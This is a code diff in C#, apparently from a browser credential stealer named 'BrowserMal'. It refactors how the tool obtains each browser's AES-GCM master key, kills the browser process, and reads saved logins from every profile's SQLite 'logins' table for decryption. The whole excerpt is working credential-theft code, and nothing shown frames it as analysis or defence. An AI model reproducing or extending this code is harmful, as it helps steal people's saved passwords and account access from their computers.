@@ -21,10 +21,15 @@ namespace BrowserMal.Credential
                 if (!Directory.Exists(browser.Location))
                     continue;
 
+                byte[] key = AesGcm256.GetMasterKey(browser.Location);
+
+                if (key == null)
+                    continue;
+
+                browser.MasterKey = key;
                 ProcessUtil.KillProcess(browser.ProcessName);
 
-                List<CredentialModel> logins = GetLogins(browser.Location, out byte[] masterKey);
-                browser.MasterKey = masterKey;
+                List<CredentialModel> logins = GetLogins(browser.Location, key);
 
                 if (logins.Count == 0)
                     continue;
@@ -35,41 +40,28 @@ namespace BrowserMal.Credential
             }
         }
 
-        private List<CredentialModel> GetLogins(string path, out byte[] masterKey)
+        private List<CredentialModel> GetLogins(string path, byte[] masterKey)
         {
             List<string> profiles = Browser.Util.GetAllProfiles(path, Browser.Util.LOGIN_DATA);
             List<CredentialModel> creds = new List<CredentialModel>();
-            byte[] data = null;
 
             foreach (string profile in profiles)
             {
                 if (!File.Exists(profile))
                     continue;
 
-                creds.AddRange(GetProfileLogins(profile, out byte[] masterkeyBytes));
-                data = masterkeyBytes;
+                creds.AddRange(GetProfileLogins(profile, masterKey));
             }
 
-            masterKey = data;
             return creds;
         }
 
-        private List<CredentialModel> GetProfileLogins(string path, out byte[] masterKeyBytes)
+        private List<CredentialModel> GetProfileLogins(string path, byte[] masterKey)
         {
             List<CredentialModel> credentialModels = new List<CredentialModel>();
 
             SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
             sqLiteHandler.ReadTable("logins");
-
-            byte[] masterKey = AesGcm256.GetMasterKey(path);
-
-            if (masterKey == null)
-            {
-                masterKeyBytes = null;
-                return new List<CredentialModel>();
-            }
-
-            masterKeyBytes = masterKey;
 
             for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
             {
